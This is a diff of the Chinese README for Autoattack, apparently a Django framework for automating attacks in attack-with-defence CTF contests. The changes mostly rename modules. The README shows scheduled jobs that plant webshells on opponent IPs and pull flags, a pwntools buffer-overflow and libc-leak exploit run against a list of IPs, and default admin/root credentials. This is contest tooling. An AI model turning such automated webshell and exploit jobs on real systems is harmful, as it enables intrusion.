@@ -37,13 +37,13 @@ Autoattack ，一个追求可视化和少操作的 awd 批量攻击框架，采�
 Watching for file changes with StatReloader
 No changes detected
 Operations to perform:
-  Apply all migrations: admin, auth, contenttypes, django_apscheduler, inhann, sessions
+  Apply all migrations: admin, auth, contenttypes, django_apscheduler, autoattack, sessions
 Running migrations:
   No migrations to apply.
 Admin account has already been initialized.
 System check identified no issues (0 silenced).
 June 01, 2022 - 12:12:12
-Django version 3.2.13, using settings 'autoattack.settings'
+Django version 3.2.13, using settings 'config.settings'
 Starting development server at http://127.0.0.1:8000/
 Quit the server with CTRL-BREAK.
 ```
@@ -81,7 +81,7 @@ pip install -r requirements.txt
 DATABASES = {
     'default': {
         'ENGINE': 'django.db.backends.mysql',  # 数据库引擎
-        'NAME': 'autoattack',  # 数据库名，事先创建
+        'NAME': 'config',  # 数据库名，事先创建
         'USER': 'root',  # 数据库用户名
         'PASSWORD': 'root',  # 密码
         'HOST': '127.0.0.1',  # mysql服务所在的主机ip
@@ -98,7 +98,7 @@ DATABASES = {
 
 ```python
 ADMIN_USERNAME = "admin"
-ADMIN_EMAIL = "root@inhann.top"
+ADMIN_EMAIL = "root@autoattack.top"
 ADMIN_PASSWORD = "admin"
 ```
 
@@ -174,23 +174,24 @@ ant.com
 比如每分钟都 传一次 webshell ，并且通过 webshell 得到 flag ：
 
 ```python
-from awdframework.django_job import Scheduler
+from utils.django_job import Scheduler
+
 scheduler = Scheduler.init()
 
-# import inhann.example.exp
-import inhann.example.write_webshell
-import inhann.example.get_flag
+# import autoattack.example.exp
+import autoattack.example.write_webshell
+import autoattack.example.get_flag
 
 jobs = [
-    # (inhann.example.exp.attacker.attack,"example.exp"),
-    (inhann.example.write_webshell.attacker.attack,"example.webshell"),
-    (inhann.example.get_flag.attacker.attack,"example.getflag"),
+    # (autoattack.example.exp.attacker.attack,"example.exp"),
+    (autoattack.example.write_webshell.attacker.attack, "example.webshell"),
+    (autoattack.example.get_flag.attacker.attack, "example.getflag"),
 ]
 jobs += [
 
 ]
 # scheduler.add_jobs(jobs,minutes=1)
-scheduler.add_jobs_cron(jobs,hour="10-12",minute="20,40")
+scheduler.add_jobs_cron(jobs, hour="10-12", minute="20,40")
 ```
 
 `(inhann.example.write_webshell.attacker.attack,"example.webshell"),` 表示把 `inhann.example.write_webshell.attacker.attack` 这个函数加入定时任务当中，id 是 `example.webshell`
@@ -299,10 +300,11 @@ pwn 的话不用写 webshell ，因此只需要参考 `直接攻击，获取 fla
 `inhann/example/pwn.py` ：
 
 ```python
-from awdframework.awd import Attack,AwdTask
+from utils.awd import Attack, AwdTask
 from os.path import dirname
 import pwn
 from LibcSearcher import LibcSearcher
+
 
 class Exp(AwdTask):
     def __init__(self, ips, port=80):
@@ -313,7 +315,7 @@ class Exp(AwdTask):
         pwn.context.arch = "i386"
         payload = pwn.flat(chr(0) * (0x2c - 0x25), 0x80)
         sh.sendline(payload)
-        e = pwn.ELF("/home/inhann/ctf")
+        e = pwn.ELF("/home/autoattack/ctf")
         write_got = e.got["write"]
         write_plt = e.plt["write"]
         # main_addr = e.symbols["main"]
@@ -342,7 +344,7 @@ class Exp(AwdTask):
         print(result)
 
 
-attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt",Exp,port=27782,thread_num=5)
+attacker = Attack(f"{dirname(__file__)}\..\..\ip.txt", Exp, port=27782, thread_num=5)
 attacker.attack()
 ```
 
@@ -350,28 +352,28 @@ attacker.attack()
 
 然后把这个 attcker 的 attack 方法，添加到 `urls.py` 里面：
 
-
 ```python
-from awdframework.django_job import Scheduler
+from utils.django_job import Scheduler
+
 scheduler = Scheduler()
 scheduler.start()
 
-# import inhann.example.exp
-# import inhann.example.write_webshell
-# import inhann.example.get_flag
-import inhann.example.pwn
+# import autoattack.example.exp
+# import autoattack.example.write_webshell
+# import autoattack.example.get_flag
+import autoattack.example.pwn
 
 jobs = [
-    # (inhann.example.exp.attacker.attack,"example.exp"),
-    # (inhann.example.write_webshell.attacker.attack,"example.webshell"),
-    # (inhann.example.get_flag.attacker.attack,"web1.getflag"),
-    (inhann.example.pwn.attacker.attack,"pwn1.exp"),
+    # (autoattack.example.exp.attacker.attack,"example.exp"),
+    # (autoattack.example.write_webshell.attacker.attack,"example.webshell"),
+    # (autoattack.example.get_flag.attacker.attack,"web1.getflag"),
+    (autoattack.example.pwn.attacker.attack, "pwn1.exp"),
 ]
 
 jobs += [
 
 ]
-scheduler.add_jobs(jobs,minutes=1)
+scheduler.add_jobs(jobs, minutes=1)
 ```
 
 
@@ -382,16 +384,21 @@ scheduler.add_jobs(jobs,minutes=1)
 
 比如说，如果要打 web2，就建立一个 `web2` 目录，然后为了记录 webshell 信息，还要在 `models.py` 里面添加一个 model （继承 `WebshellModel` ，并且定义完了要 `Web2.register()` ）：
 
-
 ```python
-from awdframework.django_job import WebshellModel
+from utils.django_job import WebshellModel
+
 
 class Example(WebshellModel):
     pass
+
+
 Example.register()
+
 
 class Web2(WebshellModel):
     pass
+
+
 Web2.register()
 ```
 
